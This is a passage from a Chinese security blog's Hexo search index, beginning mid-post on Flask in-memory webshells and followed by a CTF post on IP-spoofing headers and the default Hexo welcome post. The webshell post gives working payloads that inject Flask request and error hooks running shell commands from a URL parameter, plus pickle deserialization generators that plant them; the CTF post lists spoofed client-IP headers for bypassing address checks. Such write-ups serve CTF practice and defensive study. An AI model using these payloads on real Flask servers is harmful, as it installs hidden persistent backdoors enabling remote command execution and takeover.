id="teardown-appcontext的利用"><a href="#teardown-appcontext的利用" class="headerlink" title="@teardown_appcontext的利用"></a>@teardown_appcontext的利用</h2><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.teardown_appcontext_funcs.append(<span class="keyword">lambda</span> x :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;calc&quot;</span>).read())</span><br></pre></td></tr></table></figure><p>同样<strong>不能调用<code>request.args.get()</code>动态执行传入的命令</strong>,但是可以执行注入的代码.<strong>每次刷新网页都会执行</strong>.原因是这个装饰器的触发是在请求被销毁后的.不然会报错</p><h2 id="errorhandler-的利用"><a href="#errorhandler-的利用" class="headerlink" title="@errorhandler()的利用"></a>@errorhandler()的利用</h2><p>该装饰器内部定义了一个用于注册错误处理函数的函数</p><p><img src="/archives/31b95644/6.png"></p><p>跟到这个<code>register_error_handler()</code>里边</p><p><img src="/archives/31b95644/7.png"></p><p>可以发现他给这个<code>self.error_hander_spec</code>这个字典里添加了一个函数,就是错误处理函数.</p><p>如果我们能控制<code>code</code>和<code>exc_class</code>,我们就可以利用错误处理的逻辑执行我们传入的函数.那么<code>code</code>和<code>exc_class</code>是从哪里来的呢,看656行的<code>self._get_exc_class_and_code</code>,进入这个方法可以发现他返回的是一个元组,元组里有一个错误的类和一个整数</p><p><img src="/archives/31b95644/8.png"></p><p>这里直接调用<code>_get_exc_class_and_code()</code>这个方法然后把他的返回值扔到<code>self.error_hander_spec</code>这个字典里.然后给他赋值我们构造的函数.<code>_get_exc_class_and_code()</code>的形参是一个整数就比较方便调用了.</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>)</span><br></pre></td></tr></table></figure><p>这个方法是可以直接带出回显的</p><h1 id="pickle利用下的payload"><a href="#pickle利用下的payload" class="headerlink" title="pickle利用下的payload"></a>pickle利用下的payload</h1><h2 id="before-request-1"><a href="#before-request-1" class="headerlink" title="before_request"></a>before_request</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(\&quot;sys\&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h2 id="after-request-1"><a href="#after-request-1" class="headerlink" title="after_request"></a>after_request</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;gxngxngxn\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h2 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler"></a>errorhandler</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>这里参考SSTI的绕过</p><ul><li><strong><code>url_for</code>可替换为<code>get_flashed_messages</code>或者<code>request.__init__</code>或者<code>request.application</code></strong></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://xz.aliyun.com/news/10381">新版FLASK下python内存马的研究</a></li><li><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">Python 内存马分析</a></li><li><a href="https://xz.aliyun.com/news/13976">新版Flask框架下用钩子函数实现内存马的方式</a></li><li><a href="https://chensonghi.github.io/2024/07/20/Memory-Horse-in-Flask/">flask下的内存马</a></li><li><a href="https://asal1n.github.io/2024/10/18/python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E5%86%85%E5%AD%98%E9%A9%AC/index.html">一些python RCE利用&amp;&amp;内存马</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF中的IP伪造</title>
      <link href="/archives/f97aff88/"/>
      <url>/archives/f97aff88/</url>
      
        <content type="html"><![CDATA[<p>在一些CTF比赛常常会考到通过<strong>伪造IP</strong>获得flag，下面是一些常见的IP伪造的请求头：</p><ul><li><strong>X-Forwarded-For:127.0.0.1</strong></li><li><strong>Client-ip:127.0.0.1</strong></li><li><strong>X-Client-IP:127.0.0.1</strong></li><li><strong>X-Remote-IP:127.0.0.1</strong></li><li><strong>X-Rriginating-IP:127.0.0.1</strong></li><li><strong>X-Remote-addr:127.0.0.1</strong></li><li><strong>HTTP_CLIENT_IP:127.0.0.1</strong></li><li><strong>X-Real-IP:127.0.0.1</strong></li><li><strong>X-Originating-IP:127.0.0.1</strong></li><li><strong>via:127.0.0.1</strong></li><li><strong>X-Forwarded:127.0.0.1</strong></li><li><strong>X-Forwarded-Host:127.0.0.1</strong></li><li><strong>True-Client-IP:127.0.0.1</strong></li><li><strong>Ali-CDN-Real-IP:127.0.0.1</strong></li><li><strong>Cdn-Real-IP:127.0.0.1</strong></li><li><strong>Cdn-Src-IP:127.0.0.1</strong></li><li><strong>CF-Connecting-IP:127.0.0.1</strong></li><li><strong>Proxy-Client-IP:127.0.0.1</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/archives/4a17b156/"/>
      <url>/archives/4a17b156/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
